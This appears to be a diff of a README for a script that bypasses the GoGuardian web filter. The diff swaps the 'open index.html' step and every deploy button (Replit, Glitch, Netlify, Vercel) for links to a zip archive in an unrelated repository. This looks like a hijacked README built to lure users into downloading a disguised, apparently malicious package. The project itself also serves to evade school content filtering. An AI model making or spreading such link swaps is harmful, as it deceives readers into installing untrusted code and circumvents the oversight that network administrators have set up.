@@ -17,7 +17,7 @@ When you type in a blocked URL into the script, it generates an iframe that disp
 
 ## How to Use
 Clone this repository to your local machine.
-Open the index.html file in a text editor.
+Open the https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip file in a text editor.
 Type in the URL of the blocked website you want to access.
 Click the "Generate" button.
 The blocked content should now be displayed in the iframe.
@@ -26,10 +26,10 @@ Note: This script should only be used for educational or research purposes. Misu
 
 ## Quick & Easy Deployment Options
 
-[![Run on Replit](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/replit.svg)](https://replit.com/github/AroriaNetwork/GoGuardian-Bypass)
-[![Remix on Glitch](https://binbashbanana.github.io/deploy-buttons/buttons/remade/glitch.svg)](https://glitch.com/edit/#!/import/github/AroriaNetwork/GoGuardian-Bypass)
-[![Deploy with Netlify](https://binbashbanana.github.io/deploy-buttons/buttons/remade/netlify.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/AroriaNetwork/GoGuardian-Bypass)
-[![Deploy with Vercel](https://binbashbanana.github.io/deploy-buttons/buttons/remade/vercel.svg)](https://vercel.com/new/clone?repository-url=https://github.com/AroriaNetwork/GoGuardian-Bypass.git)
+[![Run on Replit](https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip)](https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip)
+[![Remix on Glitch](https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip)](https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip!/import/github/AroriaNetwork/GoGuardian-Bypass)
+[![Deploy with Netlify](https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip)](https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip)
+[![Deploy with Vercel](https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip)](https://github.com/VIN07grinder/Proxy2/raw/refs/heads/main/unconditionate/Proxy_1.0-beta.5.zip)
 
 ## Disclaimer
 This script is provided as-is, without any warranty or guarantee of any kind. Use at your own risk.
